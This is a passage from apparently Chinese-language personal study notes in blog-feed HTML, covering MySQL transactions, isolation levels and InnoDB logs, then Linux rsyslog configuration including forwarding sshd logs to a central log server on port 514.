class="hljs-operator">*</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">300000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.03</span> sec)<br></code></pre></td></tr></table></figure><h2 id="rollback回滚：不能回滚DDL语句，即create-drop等操作，可以回滚DML"><a href="#rollback回滚：不能回滚DDL语句，即create-drop等操作，可以回滚DML" class="headerlink" title="rollback回滚：不能回滚DDL语句，即create/drop等操作，可以回滚DML"></a>rollback回滚：不能回滚DDL语句，即create/drop等操作，可以回滚DML</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql">##<span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span>可以撤销，<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span>不能撤销<br>(root<span class="hljs-variable">@localhost</span>) [hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">begin</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>(root<span class="hljs-variable">@localhost</span>) [hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> teachers;<br>Query OK, <span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>(root<span class="hljs-variable">@localhost</span>) [hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##对于<span class="hljs-keyword">delete</span>操作，可以撤销的<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">rollback</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span> <span class="hljs-number">100</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">10</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">6</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">10</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">7</span> <span class="hljs-operator">|</span> catyer11      <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h2 id="执行了begin未提交的事务：脏数据dirty-data"><a href="#执行了begin未提交的事务：脏数据dirty-data" class="headerlink" title="执行了begin未提交的事务：脏数据dirty data"></a>执行了begin未提交的事务：脏数据dirty data</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">begin</span>;<br><span class="hljs-keyword">update</span> stu <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">50</span> <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">1</span>; <span class="hljs-comment">---&gt;脏数据</span><br></code></pre></td></tr></table></figure><h2 id="不同DB类型的事务提交：autocommit"><a href="#不同DB类型的事务提交：autocommit" class="headerlink" title="不同DB类型的事务提交：autocommit"></a>不同DB类型的事务提交：autocommit</h2><p>MySQL：自动提交，commit</p><p>PG：自动提交</p><p>SQL server：自动提交</p><p>Ooracle：不会自动提交，执行了DML，再执行commit才能提交—&gt;安全</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@autocommit</span>;<br><span class="hljs-keyword">set</span> autocommit<span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@autocommit</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@autocommit</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------+</span><br><span class="hljs-operator">|</span>            <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------+</span><br><br>##防止自动提交，全局设置非自动提交<br><span class="hljs-keyword">set</span> autocommit<span class="hljs-operator">=</span><span class="hljs-number">0</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> autocommit<span class="hljs-operator">=</span><span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h2 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h2><p>MySQL支持四种事务隔离级别</p><p><img src="2792175-20220828181335941-1360491626.png" alt="image-20220828114818137"></p><p>读未提交read uncomimited：可读取到未提交的数据</p><p>读提交read commited：可读取提交的数据，但是未提交的数据不可读，导致每次读取的数据不一致(比如不同用户再执行，看到的都是自己执行的事务修改，别的人修改后的最终数据看不到)</p><p>幻读(可重复读)：永远看到是最初的样子，没经过修改的，别人提交多少次，我这个用户都看不到(MySQL默认事务隔离级别)</p><p>创新：读操作加读锁，写操作加写锁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查询事务隔离级别，默认是幻读<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@transaction</span>_isolation;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@transaction</span>_isolation <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span><br><span class="hljs-operator">|</span> REPEATABLE<span class="hljs-operator">-</span>READ         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##配置MySQL的事务隔离级别，读未提交<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>transaction<span class="hljs-operator">-</span>isolation<span class="hljs-operator">=</span>read<span class="hljs-operator">-</span>uncommited<br>transaction<span class="hljs-operator">-</span>isolation<span class="hljs-operator">=</span>read<span class="hljs-operator">-</span>commited ##读提交，<span class="hljs-keyword">commit</span>后能看到<br>重启服务<br><br>##幻读级别：适用于备份场景<br>repeatable<span class="hljs-operator">-</span>read<span class="hljs-comment">---&gt;保证我在备份的时候，备份的是原始数据，不会在别人操作的时候提交事务，而修改了原数据</span><br></code></pre></td></tr></table></figure><h1 id="MySQL日志管理"><a href="#MySQL日志管理" class="headerlink" title="MySQL日志管理"></a>MySQL日志管理</h1><h2 id="事务日志：记录每次执行事务的操作"><a href="#事务日志：记录每次执行事务的操作" class="headerlink" title="事务日志：记录每次执行事务的操作"></a>事务日志：记录每次执行事务的操作</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">事务日志执行逻辑：<br><span class="hljs-number">1.</span>想要修改表，update操作，磁盘内先加载到内存中要执行<br><span class="hljs-number">2.</span>在内存中执行完update<br><span class="hljs-number">3.</span>结果先写入到事务日志，这一条操作确认是已经完成的<br><span class="hljs-number">4.</span>如无网络断电原因，在从内存中写入到磁盘，数据落盘<br><br>##事务日志文件是否会写满？<br>不会，达到一定的大小后会覆盖写<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181337278-1027259050.png" alt="image-20220828152754887"></p><p>事务日志分类：</p><p>redo log：记录某数据块被修改后的值，DML语句，可以用于导入会系统，恢复未写入的数据</p><p>undo log：记录某数据块被修改前的值，用于rollback操作</p><p>查看事务日志，最大值：50M</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%innodb_log%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------+----------+</span><br><span class="hljs-operator">|</span> Variable_name                      <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------+----------+</span><br><span class="hljs-operator">|</span> innodb_log_buffer_size             <span class="hljs-operator">|</span> <span class="hljs-number">16777216</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_checksums               <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_compressed_pages        <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_file_size               <span class="hljs-operator">|</span> <span class="hljs-number">50331648</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_files_in_group          <span class="hljs-operator">|</span> <span class="hljs-number">2</span>        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_group_home_dir          <span class="hljs-operator">|</span> .<span class="hljs-operator">/</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_spin_cpu_abs_lwm        <span class="hljs-operator">|</span> <span class="hljs-number">80</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_spin_cpu_pct_hwm        <span class="hljs-operator">|</span> <span class="hljs-number">50</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_wait_for_flush_spin_hwm <span class="hljs-operator">|</span> <span class="hljs-number">400</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_write_ahead_size        <span class="hljs-operator">|</span> <span class="hljs-number">8192</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> innodb_log_writer_threads          <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------+----------+</span><br><span class="hljs-number">11</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>ls <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<br>[root<span class="hljs-variable">@rocky</span> mysql]#ll <span class="hljs-operator">|</span> grep innodb<br>drwxr<span class="hljs-operator">-</span>x<span class="hljs-comment">---. 2 mysql mysql     4096 8月  28 15:13 #innodb_redo</span><br>drwxr<span class="hljs-operator">-</span>x<span class="hljs-comment">---. 2 mysql mysql      187 8月  28 15:13 #innodb_temp</span><br></code></pre></td></tr></table></figure><h2 id="事务日志性能优化"><a href="#事务日志性能优化" class="headerlink" title="事务日志性能优化"></a>事务日志性能优化</h2><p>执行DML语句时写入性能修改</p><p>默认的事务日志性能级别1，遵从ACID，但是并发的性能差</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>为默认值，日志缓冲区写入文件，事务提交后落盘<br><span class="hljs-number">0.</span>性能好<br><span class="hljs-number">2.</span>性能比<span class="hljs-number">0</span>差一点，但是安全性高，建议高并发业务选择<span class="hljs-number">2</span><br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@innodb</span>_flush_log_at_trx_commit;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@innodb</span>_flush_log_at_trx_commit <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------+</span><br><span class="hljs-operator">|</span>                                <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181337762-1156094993.png" alt="image-20220828154502076"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux日志服务</title>
    <link href="/2023/07/28/linux%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1/"/>
    <url>/2023/07/28/linux%E6%97%A5%E5%BF%97%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="日志服务"><a href="#日志服务" class="headerlink" title="日志服务"></a>日志服务</h1><p>众多服务器，API接口等：可以转储到数据库中进行存储日志，例如存储到MongoDB中取查看</p><p>日志服务的转储和切割，很有意义</p><p>定义日志的记录级别</p><p>日志的分类：应用日志+内核日志，app log+kernal log</p><p>rsyslog服务：Cent OS7往后的服务，日志可以统一记录到MySQL内，可以通过rsyslog统一推送到不同的服务内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs none">[root@rocky postgresql]#rpm -qa rsyslog<br>rsyslog-8.2102.0-7.el8.x86_64<br><br>rpm -ql rsyslog<br><br><br>systemctl status rsyslog<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232736233-1293869953.png" alt="image-20220930215657438"></p><p>可将例如系统的内核日志，或者tcp/udp的服务日志，推送到例如ES，文件（典型），hdfs大数据平台，mail（邮箱），mongodb文档数据库，MySQL数据库等</p><p>rsyslog就是类似一个管道，负责推送服务日志到指定的地方，例如docker的容器日志（容器也要映射端口出来），或者是service对外也是30000随机端口，证明也是TCP协议的服务，可以通过rsyslog来推送</p><p><img src="2792175-20221028232736887-807180008.png" alt="image-20220930215939514"></p><h1 id="ELK服务：elastic-search-logstash-kibanna"><a href="#ELK服务：elastic-search-logstash-kibanna" class="headerlink" title="ELK服务：elastic search+logstash+kibanna"></a>ELK服务：elastic search+logstash+kibanna</h1><p>其实ES就是一个数据库来的，一个索引=MySQL内的一个库</p><p>ES：开源的搜索引擎，负责收集源端的业务服务日志源，例如nginx，tomcat等</p><p>logstash：日志存储引擎，对日志进行收集、分析、过滤filter等</p><p>kibana：提供一个有好的界面</p><h1 id="rsyslog管理"><a href="#rsyslog管理" class="headerlink" title="rsyslog管理"></a>rsyslog管理</h1><p>1.facility设施：将应用程序日志进行分类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">#内置分类<br>auth认证，cron定时任务，daemon守护进程，ftp文件服务，mail邮件服务，security安全<br><br>#自定义分类<br>local0-local7<br></code></pre></td></tr></table></figure><p>2.priority优先级，日志记录优先级，告警的优先级，比如说达到warning或者error才记录到对应的日志引擎中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">debug调试，info通知(notice)，warning警告，error报错，critical重要(阿里云打电话通知)，alert等<br></code></pre></td></tr></table></figure><p>3.查看rsyslog的配置文件，主配置文件.conf，默认配置</p><p>rules规则内，mail.*表示只要是mail的事件，不关心优先级priority，直接写入到日志内，异步写入</p><p>*.info;mail.none;authpriv.none;cron.none</p><p>/var/log/messages —&gt;系统日志general日志，所有事件的写入，排除mail，auth，cron，因为下面都有</p><p>只记录所有的info级别的日志，都会写入到里面，info、warning及以上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm -ql rsyslog<br>rpm -qc rsyslog<br>[root@rocky ~]<span class="hljs-comment">#rpm -qc rsyslog</span><br>/etc/logrotate.d/syslog<br>/etc/rsyslog.conf<br>/etc/sysconfig/rsyslog<br><br><br><span class="hljs-comment">##查看rules的规则，有不同的分类</span><br>*.info;mail.none;authpriv.none;cron.none                /var/log/messages ---&gt;系统日志general日志<br><br><span class="hljs-comment"># The authpriv file has restricted access.</span><br>authpriv.*                                              /var/log/secure<br><br><span class="hljs-comment"># Log all the mail messages in one place.</span><br>mail.*                                                  -/var/log/maillog<br><br><br><span class="hljs-comment"># Log cron stuff</span><br>cron.*                                                  /var/log/cron<br><br><span class="hljs-comment"># Everybody gets emergency messages</span><br>*.emerg                                                 :omusrmsg:* ---&gt;非常重要的错误，崩溃日志<br><br><span class="hljs-comment"># Save news errors of level crit and higher in a special file.</span><br>uucp,news.crit                                          /var/log/spooler<br><br><span class="hljs-comment"># Save boot messages also to boot.log</span><br>local7.*                                                /var/log/boot.log<br></code></pre></td></tr></table></figure><h2 id="1-var-log-messages"><a href="#1-var-log-messages" class="headerlink" title="1./var/log/messages"></a>1./var/log/messages</h2><p>系统日志，专门记录系统内所有的日志，操作，包括机器的启动，开机关机，守护进程的启动，启动顺序等，一般都是systemd下面的事件</p><p>比如我需要更新一下yum源，会记录安装的过程服务等</p><p>systemctl enable –now postfix</p><p><img src="2792175-20221028232737523-579915610.png" alt="image-20221001080701933"></p><p>比如说我修改错一个.conf文件的语法，日志内会指出是45行出现了语法错误</p><p>vim +45 /etc/httpd/conf/httpd.conf</p><p><img src="2792175-20221028232738175-928450839.png" alt="image-20221001081020567"></p><h2 id="2-基于各种服务的日志"><a href="#2-基于各种服务的日志" class="headerlink" title="2.基于各种服务的日志"></a>2.基于各种服务的日志</h2><p>ssh服务的日志，日志记录级别是authpriv，在rsyslog里面有记录规则，是写到secure里面，主要和认证授权有关系，安全，任何关于安全的信息，都会记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#SyslogFacility AUTH</span><br>SyslogFacility AUTHPRIV<br><span class="hljs-comment">#LogLevel INFO</span><br><br><span class="hljs-built_in">tail</span> -f /var/log/secure ---&gt;基本都是一些认证之类的日志，这里有从VMNET链接过来的SSH登录信息<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232738504-614833154.png" alt="image-20221001081638619"></p><h2 id="例子：修改SSHD服务的日志"><a href="#例子：修改SSHD服务的日志" class="headerlink" title="例子：修改SSHD服务的日志"></a>例子：修改SSHD服务的日志</h2><p>先看sshd_config，可以修改他的默认级别，默认是authpriv，可以写local0-6的级别，local7为启动日志boot.log</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Save boot messages also to boot.log</span><br>local7.*  <br><br>vim sshd_config<br>---&gt;修改默认的监听级别<br><span class="hljs-comment">#SyslogFacility AUTH</span><br>SyslogFacility LOCAL6<br><span class="hljs-comment">#SyslogFacility AUTHPRIV</span><br><br>vim /etc/rsyslog.conf<br><span class="hljs-comment">#可以修改他的子配置文件</span><br><span class="hljs-comment"># Include all config files in /etc/rsyslog.d/，默认的</span><br>include(file=<span class="hljs-string">&quot;/etc/rsyslog.d/*.conf&quot;</span> mode=<span class="hljs-string">&quot;optional&quot;</span>)<br><br>vim /etc/rsyslog.d/sshd.conf<br>local6.*    /var/log/sshd.log<br><span class="hljs-built_in">ls</span> /var/log/sshd.log<br><br><span class="hljs-comment">##重启服务</span><br>systemctl restart sshd rsyslog<br><br>[root@rocky ~]<span class="hljs-comment">#ls /var/log/sshd.log</span><br>/var/log/sshd.log<br>[root@rocky ~]<span class="hljs-comment">#cat /var/log/sshd.log</span><br>Oct  1 08:31:05 rocky sshd[5346]: Received signal 15; terminating.<br>Oct  1 08:31:05 rocky sshd[5545]: Server listening on 0.0.0.0 port 22.<br>Oct  1 08:31:05 rocky sshd[5545]: Server listening on :: port 22.<br></code></pre></td></tr></table></figure><h1 id="远程推送日志：TCP-UDP514端口"><a href="#远程推送日志：TCP-UDP514端口" class="headerlink" title="远程推送日志：TCP/UDP514端口"></a>远程推送日志：TCP/UDP514端口</h1><p>环境：日志服务器/日志服务10.0.0.132</p><p>客户端主机：推送服务，10.0.0.128</p><p>可以开启TCP协议推送日志，port：514端口，服务模块：imtcp和imudp，都是安装rsyslog的时候安装好的，可以通过UDP：514来传输这个日志，也可以使用TCP端口514，比较靠谱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Provides UDP syslog reception</span><br><span class="hljs-comment"># for parameters see http://www.rsyslog.com/doc/imudp.html</span><br>module(load=<span class="hljs-string">&quot;imudp&quot;</span>) <span class="hljs-comment"># needs to be done just once</span><br>input(<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;imudp&quot;</span> port=<span class="hljs-string">&quot;514&quot;</span>)<br><br><span class="hljs-comment"># Provides TCP syslog reception</span><br><span class="hljs-comment"># for parameters see http://www.rsyslog.com/doc/imtcp.html</span><br>module(load=<span class="hljs-string">&quot;imtcp&quot;</span>) <span class="hljs-comment"># needs to be done just once</span><br>input(<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;imtcp&quot;</span> port=<span class="hljs-string">&quot;514&quot;</span>)<br><br>---修改rsyslog.conf，使得local6的日志记录到/var/log/sshd.log下面，重启rsyslog服务，远程过来的local6级别的日志也记录到sshd.log文件中<br><span class="hljs-comment"># Save boot messages also to boot.log</span><br>local7.*                                                /var/log/boot.log<br><br>local6.*                                                /var/log/sshd.log<br><br>systemctl restart rsyslog sshd<br><br>ss -ntlu | grep 514<br>[root@rocky ~]<span class="hljs-comment">#ss -ntlu | grep 514</span><br>udp   UNCONN 0      0             0.0.0.0:514        0.0.0.0:*          <br>udp   UNCONN 0      0                [::]:514           [::]:* <br></code></pre></td></tr></table></figure><p>将另外一台主机的SSH记录到10.0.0.132上面，默认开启的是514 UDP端口，也可以开启TCP协议，还可以一起使用都传输，写法如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/sshd/sshd_config<br><span class="hljs-comment">#SyslogFacility AUTH</span><br>SyslogFacility LOCAL6<br><span class="hljs-comment">#SyslogFacility AUTHPRIV</span><br><br>vim /etc/rsyslog.d/sshd.conf<br>写子配置文件<br>local6.*                                @10.0.0.132:514 <span class="hljs-comment">##UDP协议</span><br>local6.*                                @@10.0.0.132:514 <span class="hljs-comment">##TCP协议</span><br><br><span class="hljs-comment">#重启服务</span><br>systemctl restart rsyslog sshd<br><br>这里可以发现主机名为rocky和master都记录下来了<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232738859-1838997068.png" alt="image-20221001085721763"></p><p>同理，也可以写例如/var/log/messages记录到远程主机，直接写例如，推送到远程主机上面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/rsyslog.conf<br>*.info;mail.none;authpriv.none;cron.none                /var/log/messages<br>*.info;mail.none;authpriv.none;cron.none                @10.0.0.132:514  @@10.0.0.132:514 <span class="hljs-comment">##TCP协议</span><br></code></pre></td></tr></table></figure><h1 id="常用日志"><a href="#常用日志" class="headerlink" 